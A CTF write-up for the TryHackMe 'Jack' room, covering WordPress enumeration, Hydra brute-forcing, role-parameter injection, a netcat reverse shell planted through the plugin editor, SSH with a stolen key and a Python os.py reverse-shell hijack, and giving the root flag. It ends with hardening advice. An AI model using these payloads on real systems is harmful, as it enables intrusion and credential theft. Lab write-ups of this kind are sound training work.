# 🪓 Jack — TryHackMe CTF Writeup

> *"Here's Johnny!"*

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Hard-critical?style=for-the-badge)
![Type](https://img.shields.io/badge/Type-Challenge-orange?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Completed%20✓-brightgreen?style=for-the-badge)
![Points](https://img.shields.io/badge/Points-135-red?style=for-the-badge)
![Streak](https://img.shields.io/badge/Streak-24%20Days-blue?style=for-the-badge)

---

## 📋 Room Overview

| Field | Details |
|---|---|
| **Room Name** | Jack |
| **Platform** | TryHackMe |
| **Author** | hyena11 |
| **Difficulty** | Hard |
| **Type** | Challenge |
| **Points Earned** | 135 |
| **Tasks Completed** | 1 / 1 |
| **Streak** | 24 Days |

---

## 🎯 Objectives

- [x] Gain initial foothold on the WordPress site
- [x] Capture the **User Flag**
- [x] Escalate to **root**
- [x] Capture the **Root Flag** — `b8b63a861cc09e853f29d8055d64bffb`

---

## ⚔️ Attack Chain

```
[Nmap Scan] → [WPScan User Enum] → [Hydra Brute-Force]
     ↓                ↓                    ↓
Ports 22, 80      jack, wendy,        credentials cracked
WordPress 5.3.2   danny found         from rockyou.txt

     ↓
[Burp Suite Role Escalation] → [Plugin Editor RCE] → [Reverse Shell]
     ↓                               ↓                     ↓
&ure_other_roles=               PHP payload            www-data shell
administrator                  injected                on target

     ↓
[File System Enum] → [SSH Login (jack)] → [os.py Hijack] → [ROOT 🏆]
     ↓                      ↓                   ↓
id_rsa + shadow.bak    authenticated        reverse shell
discovered             via private key      as root
```

---

## 🔍 Phase Breakdown

### Phase 01 — Nmap Reconnaissance

```bash
nmap -sC -sV --min-rate 10000 10.10.20.120
```

**Open Ports:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| `22/tcp` | SSH | OpenSSH 7.2p2 Ubuntu | Key-based auth target |
| `80/tcp` | HTTP | Apache 2.4.18 Ubuntu | WordPress 5.3.2 — main target |

> 💡 robots.txt disallows `/wp-admin/` — instant WordPress confirmation. Added `jack.thm` to `/etc/hosts`.

---

### Phase 02 — WordPress Enumeration (WPScan)

```bash
wpscan --url http://jack.thm -e u
```

**Key Findings:**
- WordPress **5.3.2** — released 2019-12-18 **(INSECURE)**
- **XML-RPC enabled** at `/xmlrpc.php` — brute-force amplification possible
- Upload directory listing enabled at `/wp-content/uploads/`
- Theme: `online-portfolio` v0.0.7 (outdated — latest 0.1.1)
- **Users discovered: `jack`, `wendy`, `danny`**

```bash
echo -e "jack\ndanny\nwendy" > user.txt
```

---

### Phase 03 — Credential Brute-Force (Hydra)

```bash
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt jack.thm \
  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:\
  The password you entered for the username" -V -f -o jack_creds.txt
```

> ✅ Valid credentials cracked — initial WordPress login obtained (limited privileges).

---

### Phase 04 — Burp Suite Role Escalation

Intercepted the profile update POST request in **Burp Suite** and injected:

```
&ure_other_roles=administrator
```

> ⚠️ **CRITICAL:** Server accepted the parameter without validation — instant admin escalation. Classic broken access control (OWASP A01).

---

### Phase 05 — Reverse Shell via Plugin Editor

Navigated to **Plugins → Plugin Editor**, selected the first plugin, and appended:

```php
system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR-IP 7777 >/tmp/f');
```

Listener:
```bash
nc -lvnp 7777
```

> ⚡ Shell received as `www-data` — initial foothold established!

---

### Phase 06 — SSH Key Discovery & Login

From the `www-data` shell, enumerated the file system and found:

- `id_rsa` — RSA private key for user **jack**
- `shadow.bak` — Backup shadow file with password hashes

```bash
ssh -i id_rsa jack@10.10.20.120
```

> ✅ Authenticated as `jack` — escalated from `www-data` to named user.

---

### Phase 07 — Root via os.py Hijack

Jack had write access to the Python `os.py` library used by a root-level process. Injected at the end of `os.py`:

```python
import socket
import pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.11.135.230", 7778))
dup2(s.fileno(), 0)
dup2(s.fileno(), 1)
dup2(s.fileno(), 2)
pty.spawn("/bin/bash")
```

```bash
nc -lvnp 7778
```

> 🏆 **ROOT SHELL received!**
> ```
> root@jack:~# cat root.txt
> b8b63a861cc09e853f29d8055d64bffb
> ```

---

## 🏆 Completion

```
╔════════════════════════════════════════════════════╗
║   Congratulations on completing Jack!!! 🎉         ║
║                                                    ║
║   Points Earned    │  135                          ║
║   Completed Tasks  │  1                            ║
║   Difficulty       │  Hard                         ║
║   Streak           │  24 Days                      ║
╚════════════════════════════════════════════════════╝
```

---

## 🛡️ Security Recommendations

### WordPress Hardening
- **Disable the Plugin/Theme Editor** — add `define('DISALLOW_FILE_EDIT', true);` to `wp-config.php`
- **Disable XML-RPC** — block `/xmlrpc.php` at the server level if not needed
- **Keep WordPress updated** — v5.3.2 is severely outdated
- **Enforce strong passwords** — rockyou.txt should never crack production credentials
- **Rate-limit wp-login.php** — prevent brute-force attacks

### Access Control
- **Validate all role parameters server-side** — never trust user-supplied privilege data
- **Implement proper RBAC** — role changes should require admin confirmation flow

### System Security
- **Never store private keys in web-accessible paths** — id_rsa should never be reachable by www-data
- **Lock down Python library permissions** — writable system libraries are a critical PrivEsc vector
- **Run cron jobs with minimal privilege** — never run scheduled scripts as root unnecessarily

---

## 🧠 Key Lessons Learned

1. **WPScan is your best friend** against WordPress targets — run it every time
2. **HTTP parameters are not trusted input** — always validate role/privilege changes server-side
3. **Plugin editor = RCE** — disable it in every production WordPress deployment
4. **Files in odd places tell stories** — id_rsa accessible to www-data broke the entire machine
5. **Python import hijacking is devastating** — writable library files = root if a privileged process imports them

---

## ⚙️ Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service detection |
| `WPScan` | WordPress vulnerability & user enumeration |
| `Hydra` | HTTP POST brute-force against wp-login.php |
| `Burp Suite` | HTTP interception & parameter injection |
| `ffuf` | Directory fuzzing (wp-admin, wp-content discovery) |
| `netcat` | Reverse shell listener |
| `ssh` | Authentication via stolen private key |
| `Python` | os.py library hijack for PrivEsc |

---

## 🗂️ Files

| File | Description |
|------|-------------|
| `Jack_CTF_Writeup.pdf` | Full detailed PDF writeup with screenshots |
| `Jack_README.md` | This file — quick-reference summary |

---

## ⚠️ Disclaimer

> This writeup is created **exclusively for educational purposes**. All techniques should be used solely in authorized CTF/lab environments. Unauthorized system access is illegal.

---

<div align="center">

**Written by hyena11 · TryHackMe · February 2026**

*"Here's hyena!"* 🪓

</div>
